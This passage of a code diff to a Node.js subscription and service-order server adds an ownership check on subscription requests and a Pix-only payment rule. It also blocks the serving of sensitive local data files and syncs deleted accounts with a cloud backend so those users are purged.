+        if (email !== authenticatedUser.email.toLowerCase()) {
+          res.writeHead(403, { ...corsHeaders, 'Content-Type': 'application/json' });
+          return res.end(JSON.stringify({ success: false, error: 'A solicitacao deve pertencer a conta conectada.' }));
+        }
         const validPlans = ['mensal', 'anual'];
         if (!validPlans.includes(plan)) {
           res.writeHead(400, { ...corsHeaders, 'Content-Type': 'application/json' });
           return res.end(JSON.stringify({ success: false, error: 'Plano inválido. Escolha mensal (R$ 10,00) ou anual (R$ 100,00).' }));
+        }
+
+        if (method !== 'pix') {
+          res.writeHead(400, { ...corsHeaders, 'Content-Type': 'application/json' });
+          return res.end(JSON.stringify({ success: false, error: 'No momento, somente pagamento via Pix esta disponivel.' }));
         }
 
         const localUsers = getLocalUsers();
@@ -33513,8 +33527,8 @@ const server = http.createServer(async (req, res) => {
 
         const now = new Date();
         const amount = plan === 'anual' ? 100.00 : 10.00;
-        const suffix = receiptCode ? ('-DOC-' + receiptCode.replace(/[^a-zA-Z0-9]/g, '').slice(0, 14).toUpperCase()) : (cardLast4 ? ('-CARD-' + cardLast4) : '');
-        const txId = 'NEXUS-SUB-' + Date.now() + '-' + crypto.randomBytes(2).toString('hex').toUpperCase() + suffix;
+        const suffix = receiptCode ? ('-REF-' + receiptCode.replace(/[^a-zA-Z0-9]/g, '').slice(0, 14).toUpperCase()) : '';
+        const txId = 'NEXUS-SUB-' + Date.now() + '-' + crypto.randomBytes(3).toString('hex').toUpperCase() + suffix;
         const methodNames = { pix: 'Pix (SPI / BACEN)', credit_card: 'Cartão de Crédito', debit_card: 'Cartão de Débito', boleto: 'Boleto Bancário' };
 
         if (paymentConfirmed) {
@@ -34489,6 +34503,17 @@ const server = http.createServer(async (req, res) => {
     }
   }
 
+  const protectedLocalFiles = new Set([
+    'deleted_accounts.json', 'local_users.json', 'local_users.backup.json',
+    'local_database_data.json', 'local_database_data.backup.json',
+    'cpf_registry.json', 'cpf_registry.backup.json', 'local_ordens_servico.json',
+    'local_tecnicos.json', 'pending_logins.json', 'system_logs.json'
+  ]);
+  if (protectedLocalFiles.has(path.basename(pathname).toLowerCase())) {
+    res.writeHead(404, { ...corsHeaders, 'Content-Type': 'application/json' });
+    return res.end(JSON.stringify({ error: 'Arquivo não encontrado.' }));
+  }
+
   if (pathname.startsWith('/images/') || pathname.match(/\.(png|jpg|jpeg|gif|svg|ico|css|js|json|html)$/i)) {
     const safePath = path.normalize(path.join(__dirname, pathname)).replace(/^(\.\.[\/\\])+/, '');
     if (fs.existsSync(safePath) && fs.statSync(safePath).isFile()) {
@@ -34576,6 +34601,7 @@ process.on('SIGINT', () => gracefulShutdown('SIGINT'));
 let isCloudSyncRunning = false;
 let gitSyncTimer = null;
 const lastSyncedFinancialTimestamps = {};
+const deletedAccountCleanupDone = new Set();
 
 function scheduleGitSyncDebounced(delay = 60000) {
   // A sincronização bidirecional em tempo real via API HTTP (3s) já garante a persistência contínua
@@ -34592,6 +34618,34 @@ async function syncWithRenderCloud() {
   isCloudSyncRunning = true;
   try {
     // 1. Puxar usuários da nuvem (Render) - Rápido, leve e garantido (~50ms)
+    let deletedAccounts = getDeletedAccounts();
+    try {
+      const deletedRes = await fetchCloud('/api/sync/deleted-users', {
+        headers: { 'X-Nexus-Sync-Token': JWT_SECRET },
+        timeout: 2500
+      });
+      if (deletedRes.ok) {
+        const remoteDeleted = await deletedRes.json();
+        deletedAccounts = saveDeletedAccounts([...deletedAccounts, ...(Array.isArray(remoteDeleted) ? remoteDeleted : [])]);
+      }
+    } catch (e) {}
+    const deletedEmailSet = new Set(deletedAccounts.map(item => item.email));
+    await fetchCloud('/api/sync/deleted-users', {
+      method: 'POST',
+      headers: { 'X-Nexus-Sync-Token': JWT_SECRET },
+      body: JSON.stringify({ accounts: deletedAccounts })
+    }).catch(() => {});
+    for (const deletedAccount of deletedAccounts) {
+      if (!deletedAccountCleanupDone.has(deletedAccount.email)) {
+        try {
+          await purgeDeletedUserFromDatabase(deletedAccount.email);
+          removeLocalUser(deletedAccount.email);
+          deletedAccountCleanupDone.add(deletedAccount.email);
+        } catch (cleanupError) {
+          console.warn('[SYNC EXCLUSÃO] Limpeza será repetida na próxima sincronização:', cleanupError.message);
+        }
+      }
+    }
     let cloudUsers = null;
     let cloudFinancial = {};
     let cloudOrdens = null;
@@ -34602,7 +34656,8 @@ async function syncWithRenderCloud() {
         headers: { 'X-Nexus-Sync-Token': JWT_SECRET }
       });
       if (resUsers.ok) {
-        cloudUsers = await resUsers.json();
+        const remoteUsers = await resUsers.json();
+        cloudUsers = Array.isArray(remoteUsers) ? remoteUsers.filter(user => !deletedEmailSet.has(String(user.email || '').toLowerCase().trim())) : remoteUsers;
       }
     } catch(uErr){}
 
@@ -34789,6 +34844,7 @@ async function syncWithRenderCloud() {
       for (const [emailKey, financialPayload] of Object.entries(cloudFinancial)) {
         if (!emailKey || !financialPayload) continue;
         const cleanEmail = emailKey.toLowerCase().trim();
+        if (deletedEmailSet.has(cleanEmail)) continue;
         const localData = getLocalData(cleanEmail);
 
         const localTime = localData && localData.updated_at ? new Date(localData.updated_at).getTime() : 0;
@@ -34866,8 +34922,9 @@ async function syncWithRenderCloud() {
 
     // D) Enviar para o Render quaisquer usuários cadastrados localmente no SQL Server (PRESERVANDO SENHAS CRIPTOGRAFADAS E IDS)
     const localUsersRes = await pool.query('SELECT id, name, email, password, role, active, created_at, last_login, cpf, phone, birth_date, terms_accepted, device_type, must_change_password, trial_started_at, subscription_plan, subscription_status, subscription_expires_at, subscription_method, subscription_payment_id FROM usuarios ORDER BY id ASC');
-    if (localUsersRes.rows && localUsersRes.rows.length > 0) {
-      const usersToSync = localUsersRes.rows.map(u => {
+    const syncableLocalUsers = (localUsersRes.rows || []).filter(u => !deletedEmailSet.has(String(u.email || '').toLowerCase().trim()));
+    if (syncableLocalUsers.length > 0) {
+      const usersToSync = syncableLocalUsers.map(u => {
         const uCopy = { ...u };
         if (uCopy.last_login) {
           uCopy.last_login = getBrasiliaIsoString(uCopy.last_login);
@@ -34892,6 +34949,7 @@ async function syncWithRenderCloud() {
     const allLocalFin = getLocalAllFinancialData();
     for (const [emKey, dataVal] of Object.entries(allLocalFin)) {
       if (!emKey || !dataVal) continue;
+      if (deletedEmailSet.has(String(emKey).toLowerCase().trim())) continue;
       await fetchCloud('/api/data', {
         method: 'POST',
         body: JSON.stringify({ email: emKey, data: dataVal, forceEmpty: true })
